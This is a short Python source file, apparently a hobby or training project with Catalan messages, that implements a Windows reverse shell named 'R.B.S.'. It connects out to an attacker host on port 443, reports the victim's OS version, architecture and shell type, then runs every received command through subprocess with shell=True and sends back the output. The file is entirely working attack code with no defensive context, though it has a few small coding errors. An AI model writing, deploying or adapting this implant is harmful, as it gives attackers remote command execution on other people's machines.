import socket
import subprocess
import time
import platform
import os


LHOST="192.168.x.x"
LPORT=443
BUFFER_SIZE=1024
os_name=platform.system()
os_version=platform.version()
os_release=platform.release()
Architecture=platform.machine()
build=int(os_version.split(".")[2])
shell=os.environ.get("ComSpec","").lower()
user=os.getlogin()
userShell=f"{user}>> "

client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((LHOST,LPORT))
client.sendall(b"[+] Reverse shell connectada a:\n")
time.sleep(0.1)
client.sendall(b"[+]"+os_name.encode('utf-8')+b"\n")
time.sleep(0.1)
client.sendall(b"[+]"+os_version.encode('utf-8')+b"\n")
time.sleep(0.1)
client.sendall(b"[+]"+os_release.encode('utf-8')+b"\n")
time.sleep(0.1)
client.sendall(b"[+]"+Architecture.encode('utf-8')+b"\n")
time.sleep
if build>=22000:
    client.sendall(b"[+]Windows 11\n")
else:
    client.sendall(b"[+]Windows 10\n")
time.sleep(0.1)
if "cmd.exe" in shell:
    client.sendall(b"[+]Tipus de shell: cmd\n")
elif "powershell" in shell:
    client.sendall(b"[+]Tipus de shell: powershell\n")
else:
    client.sendall(b"[+]Tipus de shell desconeguda"+shell.encode('utf-8')+b"\n")
time.sleep(0.5)
client.sendall(b"3...\n")
time.sleep(1)
client.sendall(b"2...\n")
time.sleep(1)
client.sendall(b"1...\n")
time.sleep(1)
client.sendall("Reverse shell R.B.S. iniciada, escriu les ordres a continuació:\n".encode("utf-8"))
while True:
    try:
        client.sendall(userShell.encode('utf-8'))
        data=client.recv(BUFFER_SIZE)
        if not data:
            break
        code=data.decode('utf-8').strip()
        #client.sendall(f"{userShell}{code}\n".encode('utf-8'))
        if len(code)>1:
            try:
                output=subprocess.check_output(code,shell=True,stderr=subprocess.STDOUT)
            except subprocessCalledProcessError as error:
                output=error
            client.send(output)
    except Exception as error:
        client.send(f"Error {error}")
client.close